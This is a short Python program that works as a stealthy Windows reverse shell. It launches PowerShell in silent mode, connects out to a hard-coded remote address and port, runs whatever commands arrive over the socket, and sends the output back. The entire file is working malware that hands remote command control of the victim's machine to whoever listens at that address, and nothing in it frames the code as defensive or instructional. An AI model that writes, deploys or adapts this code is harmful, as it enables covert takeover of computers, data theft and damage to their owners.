import subprocess
import threading
import socket
import sys
import os


__author__ = "0xded"


silentMode = True
env = os.environ.copy()
powershell = subprocess.Popen("powershell.exe", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True, env=env)
flag = True 

def response(target: socket.socket, process: subprocess.Popen) -> None:
    if not silentMode: sys.stdout.write("Started Powershell.exe\r\n\r\n")
    global flag

    while flag:
        data = process.stdout.read(1)
        target.send(data)

        if not silentMode:
            sys.stdout.write(data.decode())
            sys.stdout.flush()

def sendcommand(process: subprocess.Popen, command):
    try:
        process.stdin.write(command + b'\n')
        process.stdin.flush()

    except:
        if not silentMode:
            print("[!] Exiting (sendcommand::error)")
        sys.exit()


if __name__ == "__main__":
    addr_v4 = "10.100.102.31"
    port = 20031
    addr = (addr_v4, port)

    targetSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    targetSock.connect(addr)

    responseThread = threading.Thread(target=response, args=(targetSock, powershell,), daemon=True)
    responseThread.start()
    
    while True:
        try:
            data = targetSock.recv(1024)
            dataRecv = data.decode()
            if dataRecv != "":
                if dataRecv == "stop" or dataRecv == "exit" or dataRecv == "quit":
                    flag = False
                    targetSock.close()
                    break
                
                sendcommand(powershell, data)

        except Exception as e:
            if not silentMode:
                print(f"Error: {e}")
        
        except KeyboardInterrupt:
            if not silentMode:
                print("[!] Keyboard Interrupt!")
                flag = False
                targetSock.close()
                break

        except:
            if not silentMode:
                print("Idk?")

    if not silentMode: print("[X] Goodbye!")
